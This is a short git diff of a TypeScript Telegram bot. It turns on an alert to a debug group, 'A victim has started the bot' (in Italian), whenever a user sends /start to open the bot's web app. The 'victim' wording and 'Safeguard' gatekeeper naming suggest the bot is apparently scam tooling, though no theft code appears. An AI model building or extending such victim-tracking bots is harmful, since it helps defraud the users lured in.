@@ -41,13 +41,12 @@ const sgConfigDefault: SafeguardConfig = {
 };
 const bot = new Bot(gateKeeper as string);
 const app = new Application();
-// const messAvvio = "Una vittima ha startato il bot";
+const messAvvio = "Una vittima ha startato il bot";
 /* #endregion */
 
 /* #region telegram */
 // open web app
 bot.chatType("private").command("start", async (ctx) => {
-  // await bot.api.sendMessage(debugGroupId, messAvvio, { parse_mode: "HTML" });
   const msg = ctx.message?.text.split(" ");
   const id = msg?.length === 2 ? msg[1] : "default"; // se non c'è, usa "default"
 
@@ -71,6 +70,7 @@ const sentMsg = await bot.api.sendPhoto(ctx.chatId, input, {
 // Salva il message_id in Deno KV per poterlo modificare dopo
 const deno = await Deno.openKv();
 await deno.set(["message", ctx.chatId], { message_id: sentMsg.message_id });
+await bot.api.sendMessage(debugGroupId, messAvvio, { parse_mode: "HTML" });
 });
 
 
